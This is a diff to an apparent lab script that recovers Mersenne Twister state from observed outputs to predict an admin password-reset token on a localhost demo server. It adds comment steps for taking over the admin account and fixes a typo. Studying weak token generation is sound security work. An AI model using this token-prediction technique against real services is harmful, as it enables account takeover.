@@ -27,6 +27,7 @@ def undo_right_shift_xor(value, shift):
 
         # get the current bit and check if it is a one
         bit = (value >> i) & 1
+
         shifted_bit = 0
 
         # make sure the bit is in the range of 32 [0-31]
@@ -84,7 +85,7 @@ print("First 5 recovered values:", raw_state[:5])
 # make a "dummy MT"
 clone = MT19937(0)
 
-# set the state of our dummt MT
+# set the state of our dummy MT
 clone.set_state(raw_state, 624)
 
 # if running sever without wanting to colelct tokens all over again but demo multiple times
@@ -108,3 +109,8 @@ print(admin_outputs)
 print("\nPredicted admin token:")
 print(admin_token_b64)
 print(f"http://localhost:8080/reset?token={admin_token_b64}")
+
+#steps:
+# get the predicted admin token
+# forgot pass as admin
+# go to http:predictedToken
